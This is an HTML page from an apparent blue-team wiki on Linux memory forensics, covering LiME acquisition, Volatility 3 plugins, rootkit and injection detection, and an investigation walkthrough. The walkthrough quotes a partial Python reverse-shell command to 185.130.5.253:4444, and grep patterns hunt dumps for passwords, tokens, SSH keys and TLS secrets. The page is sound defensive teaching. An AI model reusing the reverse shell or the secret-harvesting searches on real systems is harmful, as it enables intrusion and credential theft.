@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<title>Memory Forensics | Cookie Engineer's Cyber Wiki</title>
+
+		<!-- Meta -->
+		<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=0.5, maximum-scale=2, user-scalable=yes">
+		<meta name="mobile-web-app-capable" content="yes">
+		<meta name="mobile-web-app-status-bar-style" content="black-translucent">
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="creator" content="Cookie Engineer">
+		<meta name="description" content="Memory Forensics">
+		<meta name="keywords" content="blueteam, dfir, injection, memory-forensics, rootkits, volatility">
+		<meta name="generator" content="Cookie Engineer's bare hands with peppermint tea and nightly VIM coding sessions">
+		<meta name="robots" content="index, follow">
+
+		<!-- Social Media -->
+		<meta property="og:title" content="Memory Forensics">
+		<meta property="og:site_name" content="Cookie Engineer's Wiki">
+		<meta property="og:description" content="Extracting and analyzing volatile memory to uncover rootkits, injected code, and attacker artefacts.">
+		<meta property="og:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+		<meta property="og:url" content="https://cookie.engineer/wiki/articles/blueteam/memory-forensics.md">
+		<meta property="og:type" content="article">
+
+		<!-- Shitter -->
+		<meta name="twitter:card" content="summary">
+		<meta name="twitter:domain" content="cookie.engineer">
+		<meta name="twitter:title" itemprop="name" content="Memory Forensics">
+		<meta name="twitter:description" itemprop="description" content="Extracting and analyzing volatile memory to uncover rootkits, injected code, and attacker artefacts.">
+		<meta name="twitter:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+
+		<!-- Website Design -->
+		<link rel="stylesheet" href="/design/index.css">
+		<link rel="stylesheet" href="/design/highlight.css">
+		<script type="module" src="/design/index.mjs" defer></script>
+	</head>
+	<body data-layout="article">
+		<header>
+			<div><button data-action="toggle-aside" title="Toggle Sidebar" class="visible"></button><button data-action="toggle-theme" title="Switch Dark/Light Theme"></button><button data-action="toggle-font" title="Switch Dyslexic/Normal Fonts"></button><button data-action="open-website" title="Navigate to Website Index"></button><button data-action="open-wiki" title="Navigate to Wiki Index"></button></div>
+			<div><img src="/design/about/cookiengineer.png" width="32" height="32" /><h1><a href="/wiki/index.html">Cookie Engineer's Cyber Wiki</a></h1></div>
+			<div></div>
+		</header>
+
+		<div>
+		<aside class="visible">
+			<ul class="toc">
+				<li>
+					<b><a href="#overview">Overview</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#required-reading">Required Reading</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#memory-acquisition">Memory Acquisition</a></b>
+					<ul>
+						<li><a href="#linux-lime-acquisition">Linux LiME Acquisition</a></li>
+						<li><a href="#linux-prockcore">Linux /proc/kcore</a></li>
+						<li><a href="#linux-devfmem-deprecated">Linux /dev/fmem (deprecated)</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#volatility-3">Volatility 3</a></b>
+					<ul>
+						<li><a href="#volatility-2-vs-volatility-3">Volatility 2 vs Volatility 3</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#essential-volatility-3-commands">Essential Volatility 3 Commands</a></b>
+					<ul>
+						<li><a href="#process-enumeration">Process Enumeration</a></li>
+						<li><a href="#network-analysis">Network Analysis</a></li>
+						<li><a href="#process-memory-analysis">Process Memory Analysis</a></li>
+						<li><a href="#kernel-analysis">Kernel Analysis</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#process-injection-detection">Process Injection Detection</a></b>
+					<ul>
+						<li><a href="#malfind-for-injected-code">malfind for Injected Code</a></li>
+						<li><a href="#injection-techniques">Injection Techniques</a></li>
+						<li><a href="#injection-hunting-workflow">Injection Hunting Workflow</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#rootkit-detection">Rootkit Detection</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#credential-extraction-from-memory">Credential Extraction from Memory</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#network-connection-reconstruction">Network Connection Reconstruction</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#practical-investigation-walkthrough">Practical Investigation Walkthrough</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#challenge">Challenge</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#references">References</a></b>
+					<ul>
+					</ul>
+				</li>
+			</ul>
+		</aside>
+
+			<main>
+				<nav aria-label="breadcrumbs">
+					<ol>
+						<li><a href="/wiki/index.html">Wiki</a></li>
+						<li><a href="/wiki/articles/blueteam/index.html">Blueteam</a></li>
+						<li aria-current="page"><a href="/wiki/articles/blueteam/memory-forensics.html">Memory Forensics</a></li>
+					</ol>
+				</nav>
+
+				<article>
+					<h2 id="memory-forensics">Memory Forensics</h2>
+					<p>Extracting and analyzing volatile memory to uncover rootkits, injected code, and attacker artefacts.</p>
+					<section>
+						<h3 id="overview">Overview</h3>
+						<p>
+							Memory forensics analyzes the contents of volatile RAM to uncover evidence that never touches
+							disk. Fileless malware, process injection, rootkits, encryption keys, plaintext credentials,
+							active network connections, and console histories all exist only in memory. If you collect a
+							disk image without capturing RAM, you have lost the most valuable evidence.
+						</p>
+						<p>
+							Memory is the most volatile data source (first in the collection order), but also the richest.
+							Nearly everything the attacker is currently doing - and has recently done - is reconstructable
+							from a memory dump with the right tools.
+						</p>
+					</section>
+					<section>
+						<h3 id="required-reading">Required Reading</h3>
+						<ul>
+							<li><a href="/wiki/articles/fundamentals/processes.html">Processes</a> - process lifecycle, /proc, kernel-to-userspace interfaces</li>
+							<li><a href="/wiki/articles/fundamentals/virtual-memory.html">Virtual Memory</a> - page tables, virtual address spaces, mmap, VAD</li>
+							<li><a href="/wiki/articles/fundamentals/elf.html">ELF</a> - executable headers, sections, segments, PLT/GOT</li>
+						</ul>
+					</section>
+					<section>
+						<h3 id="memory-acquisition">Memory Acquisition</h3>
+						<h4 id="linux-lime-acquisition">Linux LiME Acquisition</h4>
+						<p>
+							LiME is the standard kernel module-based acquisition tool. It must be compiled for the exact
+							kernel version of the target system.
+						</p>
+						<pre class="bash">
+# Pre-compile LiME for your kernel versions and store in jump kit
+git clone https://github.com/504ensicsLabs/LiME.git
+cd LiME/src
+make
+
+# Acquire memory to a file
+sudo insmod lime-$(uname -r).ko &#34;path=/mnt/evidence/memory.dump format=lime&#34;
+
+# Acquire over network (no local storage needed)
+sudo insmod lime-$(uname -r).ko &#34;path=tcp:4444 format=lime&#34;
+# On receiving machine:
+nc -l 4444 &gt; memory.dump
+						</pre>
+						<h4 id="linux-prockcore">Linux /proc/kcore</h4>
+						<pre class="bash">
+# /proc/kcore is the kernel&#39;s view of physical memory
+# Limited: does not include device memory, restricted on hardened kernels
+sudo dd if=/proc/kcore of=/mnt/evidence/memory.dump bs=1M
+# WARNING: /proc/kcore on modern kernels only exposes kernel memory,
+# not userspace process memory. This is incomplete for forensic purposes.
+						</pre>
+						<h4 id="linux-devfmem-deprecated">Linux /dev/fmem (deprecated)</h4>
+						<pre class="bash">
+# /dev/fmem creates a /dev/mem-like device for full physical memory access
+# Requires: fmem kernel module
+modprobe fmem
+dd if=/dev/fmem of=/mnt/evidence/memory.dump bs=1M
+						</pre>
+					</section>
+					<section>
+						<h3 id="volatility-3">Volatility 3</h3>
+						<p>
+							Volatility 3 is the current standard. It is a complete rewrite of Volatility 2 with a plugin-based
+							architecture, automatic symbol table retrieval, and a Python 3 codebase.
+						</p>
+						<pre class="bash">
+# Install on ArchLinux
+sudo pacman -S volatility3
+
+# Or via pip
+pip install volatility3
+
+# Verify installation
+vol --help
+						</pre>
+						<h4 id="volatility-2-vs-volatility-3">Volatility 2 vs Volatility 3</h4>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Feature</th>
+									<th align="center">Volatility 2</th>
+									<th align="center">Volatility 3</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">Python version</td>
+									<td align="center">2.7</td>
+									<td align="center">3.6+</td>
+								</tr>
+								<tr>
+									<td align="center">Profiles</td>
+									<td align="center">Manual download,<code>--profile=</code></td>
+									<td align="center">Automatic symbol tables from ISF</td>
+								</tr>
+								<tr>
+									<td align="center">Plugin invocation</td>
+									<td align="center"><code>vol.py --profile=Linux ... pslist</code></td>
+									<td align="center"><code>vol -f dump.mem linux.pslist</code></td>
+								</tr>
+								<tr>
+									<td align="center">Output format</td>
+									<td align="center">Text tables</td>
+									<td align="center">JSON by default, text with<code>--renderer</code></td>
+								</tr>
+								<tr>
+									<td align="center">Plugin architecture</td>
+									<td align="center">Monolithic scan methods</td>
+									<td align="center">Modular plugins, automagic, layer system</td>
+								</tr>
+								<tr>
+									<td align="center">Memory models</td>
+									<td align="center">Single address space</td>
+									<td align="center">Multi-layered address spaces</td>
+								</tr>
+							</tbody>
+						</table>
+					</section>
+					<section>
+						<h3 id="essential-volatility-3-commands">Essential Volatility 3 Commands</h3>
+						<h4 id="process-enumeration">Process Enumeration</h4>
+						<pre class="bash">
+# List running processes — your starting point for every investigation
+vol -f memory.dump linux.pslist
+
+# Process tree — parent-child relationships
+vol -f memory.dump linux.pstree
+
+# Process command line arguments and environment
+vol -f memory.dump linux.psaux
+
+# Process capabilities
+vol -f memory.dump linux.capabilities
+
+# Find hidden processes by comparing multiple enumeration methods
+vol -f memory.dump linux.pslist   # walks the task_struct list
+vol -f memory.dump linux.psscan   # scans memory for task_struct signatures
+vol -f memory.dump linux.pstree   # process hierarchy
+
+# If pslist shows 47 processes and psscan shows 49, you have 2 hidden processes
+						</pre>
+						<h4 id="network-analysis">Network Analysis</h4>
+						<pre class="bash">
+# Active network connections with owning process
+vol -f memory.dump linux.sockscan
+
+# Network interfaces and IP configuration
+vol -f memory.dump linux.ip.Addr
+
+# Reconstruct network sockets from the netstat structures
+vol -f memory.dump linux.sockstat
+						</pre>
+						<h4 id="process-memory-analysis">Process Memory Analysis</h4>
+						<pre class="bash">
+# Extract a process&#39;s full memory space
+vol -f memory.dump linux.proc.Maps --pid 1234 --dump
+
+# Dump a process&#39;s executable image
+vol -f memory.dump linux.elfs --pid 1234
+
+# List mapped files (libraries, mmaps, shared memory)
+vol -f memory.dump linux.lsof --pid 1234
+
+# List DLLs/shared libraries loaded by a process
+vol -f memory.dump linux.library_list --pid 1234
+
+# Bash history from memory (recover commands typed on the compromised system)
+vol -f memory.dump linux.bash
+# This recovers bash command history from all bash processes in memory
+# Even if .bash_history was deleted or never written to disk
+						</pre>
+						<h4 id="kernel-analysis">Kernel Analysis</h4>
+						<pre class="bash">
+# Loaded kernel modules — compare with lsmod output to find hidden modules
+vol -f memory.dump linux.lsmod
+
+# Check for kernel module hooks
+vol -f memory.dump linux.check_modules
+
+# System call table — detect hooked syscalls
+vol -f memory.dump linux.check_syscall
+
+# Kernel debug messages
+vol -f memory.dump linux.kmsg
+						</pre>
+					</section>
+					<section>
+						<h3 id="process-injection-detection">Process Injection Detection</h3>
+						<p>
+							Detection of code injection is the most critical memory forensic technique. Attackers inject
+							code to hide execution, evade process-based detection, and maintain stealth.
+						</p>
+						<h4 id="malfind-for-injected-code">malfind for Injected Code</h4>
+						<pre class="bash">
+# malfind flags memory regions with PAGE_EXECUTE_READWRITE protection
+# that also contain a PE header or shellcode prologue
+vol -f memory.dump linux.malfind --pid 1234
+
+# Key indicators malfind looks for:
+# - Memory region is both writable AND executable (RWX)
+# - Memory region is private (not mapped from a file)
+# - Memory region contains executable code signatures
+# - Memory region is in a process that shouldn&#39;t have RWX regions
+						</pre>
+						<h4 id="injection-techniques">Injection Techniques</h4>
+						<pre class="bash">
+# HollowProcesses — detect process hollowing
+# Process hollowing: create a suspended process, unmaps its code,
+# replaces it with malicious code, then resumes
+# Indicators:
+# - Process has executable image that doesn&#39;t match its inode on disk
+# - Process VAD tree structure is inconsistent with normal process
+vol -f memory.dump windows.hollowprocesses  # (Windows-specific)
+# For Linux: compare /proc/pid/exe with memory image
+
+# Detect LD_PRELOAD injection (Linux)
+# Check if any process has LD_PRELOAD set in its environment
+vol -f memory.dump linux.psaux | grep -i &#39;LD_PRELOAD&#39;
+
+# Detect ptrace-based injection
+# Processes being traced (ptrace) show a tracer PID
+# Check /proc/pid/status → TracerPid ≠ 0 is suspicious
+vol -f memory.dump linux.pstree  # Look for unexpected parent-child relationships
+						</pre>
+						<h4 id="injection-hunting-workflow">Injection Hunting Workflow</h4>
+						<pre class="bash">
+# 1. Find suspicious RWX memory regions
+vol -f memory.dump linux.malfind &gt; malfind_output.txt
+
+# 2. For each suspicious PID, dump its full memory space
+vol -f memory.dump linux.proc.Maps --pid 1234 --dump
+
+# 3. Scan the extracted memory with YARA for known malware
+yara rules/malware/cobalt_strike.yar pid1234_mem
+
+# 4. Extract strings from the memory region for IOCs
+strings -t d pid1234_mem | grep -iE &#39;http://|https://|\.com|\.net|cmd\.exe|pwd|User-Agent&#39;
+
+# 5. Check for shellcode patterns (common instruction sequences)
+# NOP sled: 0x90 repeated
+xxd pid1234_mem | grep &#39;9090 9090 9090 9090&#39;
+
+# 6. Extract the mapped memory regions to find anomalies
+vol -f memory.dump linux.proc.Maps --pid 1234
+						</pre>
+					</section>
+					<section>
+						<h3 id="rootkit-detection">Rootkit Detection</h3>
+						<p>
+							Rootkits operate at kernel level. They can hide processes, files, network connections, and kernel
+							modules from userspace tools.
+						</p>
+						<pre class="bash">
+# Cross-view detection — compare multiple enumeration methods
+# Hidden process check
+vol -f memory.dump linux.pslist &gt; /tmp/pslist.txt
+vol -f memory.dump linux.psscan &gt; /tmp/psscan.txt
+diff /tmp/pslist.txt /tmp/psscan.txt
+# Any process in psscan but NOT in pslist is hidden
+
+# Hidden module check
+vol -f memory.dump linux.lsmod &gt; /tmp/lsmod_vol.txt
+# Compare with lsmod from the live system (if available)
+# Modules in the volatile scan but not in lsmod are hidden
+
+# System call table integrity
+vol -f memory.dump linux.check_syscall
+# Output shows each syscall entry, its expected address range,
+# and whether it has been hooked (address outside expected module range)
+
+# Kernel module syscall hooks
+vol -f memory.dump linux.check_modules
+# Detects modules that have hooked syscalls
+
+# Interrupt Descriptor Table (IDT) hooks
+vol -f memory.dump linux.check_idt
+# Some rootkits hook IDT entries instead of syscall table
+
+# Hidden network connections
+vol -f memory.dump linux.sockscan &gt; /tmp/netscan.txt
+# Compare with netstat from live system
+# Connections in memory but not in netstat are hidden
+						</pre>
+					</section>
+					<section>
+						<h3 id="credential-extraction-from-memory">Credential Extraction from Memory</h3>
+						<pre class="bash">
+# Recover bash history from all processes
+vol -f memory.dump linux.bash
+# Extracts bash command history buffers from process memory
+# These contain typed commands even if .bash_history was deleted
+
+# Find plaintext credentials in process memory
+strings -a memory.dump | grep -iE \
+  &#39;password=|passwd=|pwd=|secret=|token=|api_key=|credential=&#39;
+
+# Extract environment variables from process memory
+vol -f memory.dump linux.psaux
+# Environment may contain: DATABASE_URL, API_SECRET, AWS_ACCESS_KEY_ID
+
+# Recover SSH private key fragments
+strings -a memory.dump | grep -A5 -B5 \
+  &#39;BEGIN OPENSSH PRIVATE KEY&#39;
+strings -a memory.dump | grep -A5 -B5 \
+  &#39;BEGIN RSA PRIVATE KEY&#39;
+
+# Find SSL/TLS session keys
+strings -a memory.dump | grep -E \
+  &#39;CLIENT_RANDOM|SESSION_TICKET|MASTER_SECRET&#39;
+						</pre>
+					</section>
+					<section>
+						<h3 id="network-connection-reconstruction">Network Connection Reconstruction</h3>
+						<pre class="bash">
+# Full network state from memory
+vol -f memory.dump linux.sockscan --output json &gt; netscan.json
+
+# Parse and analyze
+python3 &lt;&lt; &#39;EOF&#39;
+import json
+
+with open(&#39;netscan.json&#39;) as f:
+    data = json.load(f)
+
+connected = [r for r in data[&#39;rows&#39;]
+             if r.get(&#39;State&#39;, &#39;&#39;) == &#39;ESTABLISHED&#39;]
+
+for conn in connected:
+    pid = conn.get(&#39;PID&#39;, &#39;?&#39;)
+    src = conn.get(&#39;LocalAddr&#39;, &#39;?&#39;)
+    dst = conn.get(&#39;ForeignAddr&#39;, &#39;?&#39;)
+    dport = conn.get(&#39;ForeignPort&#39;, &#39;?&#39;)
+    proc = conn.get(&#39;Process&#39;, &#39;?&#39;)
+    print(f&#34;PID {pid} ({proc}): {src} → {dst}:{dport}&#34;)
+EOF
+
+# Cross-reference with known C2 IOCs
+grep -E &#39;(185\.130\.|194\.26\.|evil.*\.com)&#39; netscan.json
+						</pre>
+					</section>
+					<section>
+						<h3 id="practical-investigation-walkthrough">Practical Investigation Walkthrough</h3>
+						<p>
+							Scenario: Web server compromised. Disk image shows nothing suspicious. Memory dump reveals the
+							attack.
+						</p>
+						<pre class="bash">
+# Step 1: Get an overview of the system
+vol -f memory.dump banners.Banners
+# Shows: detected operating system banner, kernel version, distribution
+
+# Step 2: Identify the attacker&#39;s processes
+vol -f memory.dump linux.pstree
+# Look for:
+# - Apache/httpd spawning /bin/sh (web shell)
+# - Processes running from /tmp, /var/tmp, /dev/shm
+# - Processes with names that mimic system processes (e.g., [kworker/0:1] vs [kworker/0:1] — note subtle name difference)
+# - Processes with unusually short uptime (compared to system boot time)
+
+# Example output analysis:
+# systemd (1)
+# └── httpd (847)
+#     └── httpd (852)
+#         └── sh (12345)          ← SUSPICIOUS: httpd shouldn&#39;t spawn sh
+#             └── python3 (12346)  ← SUSPICIOUS: reverse shell?
+#                 └── bash (12347)
+
+# Step 3: Investigate the suspicious process
+vol -f memory.dump linux.psaux --pid 12346
+# Output: python3 -c &#39;import socket,subprocess,os;
+# s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+# s.connect((&#34;185.130.5.253&#34;,4444));os.dup2(...)&#39;
+# → Confirmed: Python reverse shell connecting to 185.130.5.253:4444
+
+# Step 4: Extract the malicious process for further analysis
+vol -f memory.dump linux.proc.Maps --pid 12346 --dump
+
+# Step 5: Scan the extracted process memory with YARA
+yara rules/rat/python_reverse_shell.yar pid12346_mem
+
+# Step 6: Check for additional compromised processes
+vol -f memory.dump linux.pstree --pid 12346
+# Check all children of the reverse shell process
+
+# Step 7: Find the web shell that spawned the reverse shell
+vol -f memory.dump linux.lsof --pid 852
+# Check what files the httpd worker was accessing
+# Look for .php files in unexpected locations
+
+# Step 8: Check for persistence mechanisms
+vol -f memory.dump linux.bash
+# Did the attacker add cron jobs, SSH keys, or modify systemd services?
+
+# Step 9: Extract IOCs
+# IPs: 185.130.5.253:4444 (C2)
+# Port: 4444 (reverse shell listener)
+# Technique: Python reverse shell spawned via web shell
+vol -f memory.dump linux.sockscan | grep &#34;185.130.5.253&#34;
+						</pre>
+					</section>
+					<section>
+						<h3 id="challenge">Challenge</h3>
+						<p>
+							Analyze the memory dump in the container: find the reverse shell, the hidden kernel module,
+							and the recovered credentials. The image ships a synthetic dump and a set of guided exercises.
+						</p>
+						<p><a href="/wiki/articles/blueteam/memory-forensics.Containerfile">memory-forensics.Containerfile</a></p>
+						<pre class="bash">
+# Build and run the guided exercise
+podman build -t memory-forensics-lab -f memory-forensics.Containerfile .
+podman run -it --rm memory-forensics-lab
+
+# Or mount your own memory dump
+podman run -it --rm -v $(pwd)/evidence:/evidence memory-forensics-lab \
+  vol -f /evidence/memory.dump linux.pslist
+						</pre>
+					</section>
+					<section>
+						<h3 id="references">References</h3>
+						<ul>
+							<li><a class="icon-website" href="https://volatility3.readthedocs.io/" target="_blank">Volatility 3 Documentation</a></li>
+							<li><a class="icon-website" href="https://www.memoryanalysis.net/" target="_blank">The Art of Memory Forensics (Ligh, Case, Levy, Walters)</a></li>
+							<li><a class="icon-github" href="https://github.com/504ensicsLabs/LiME" target="_blank">LiME - Linux Memory Extractor</a></li>
+							<li><a class="icon-website" href="https://andreafortuna.org/forensics/volatility-memory-forensics-cheat-sheet/" target="_blank">Volatility Memory Forensics Cheat Sheet</a></li>
+						</ul>
+					</section>
+				</article>
+			</main>
+		</div>
+
+		<footer>
+			<div></div>
+			<div class="print-not">Made with 💔 in Germany. &copy; Cookie Engineer (https://cookie.engineer). All rights (and jokes) reserved under European Law.</div>
+			<div></div>
+		</footer>
+
+	</body>
+</html>
